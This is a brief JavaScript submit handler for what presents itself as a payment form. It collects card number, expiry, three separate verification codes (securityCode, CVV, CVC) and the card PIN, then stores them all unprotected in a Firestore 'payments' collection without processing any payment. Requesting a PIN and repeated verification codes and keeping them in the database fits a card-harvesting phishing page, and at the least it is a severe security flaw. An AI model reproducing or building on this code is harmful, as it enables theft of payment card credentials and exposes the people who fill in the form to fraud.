document.getElementById("paymentForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  // Retrieve form values
  const name = document.getElementById("name").value;
  const email = document.getElementById("email").value;
  const card = document.getElementById("card").value;
  const expDate = document.getElementById("expDate").value;
  const securityCode = document.getElementById("securityCode").value;
  const cvv = document.getElementById("cvv").value;
  const cvc = document.getElementById("cvc").value;
  const pin = document.getElementById("pin").value;
  const phone = document.getElementById("phone").value || null; // Optional field

  try {
    // Save the details to Firestore
    await db.collection("payments").add({
      name: name,
      email: email,
      card: card,
      expDate: expDate,
      securityCode: securityCode,
      cvv: cvv,
      cvc: cvc,
      pin: pin,
      phone: phone, // Store optional phone number
      timestamp: firebase.firestore.FieldValue.serverTimestamp(),
    });

    // Reset form and notify user
    alert("Payment details saved successfully!");
    document.getElementById("paymentForm").reset();
  } catch (error) {
    console.error("Error saving payment details: ", error);
    alert("Failed to save payment details.");
  }
});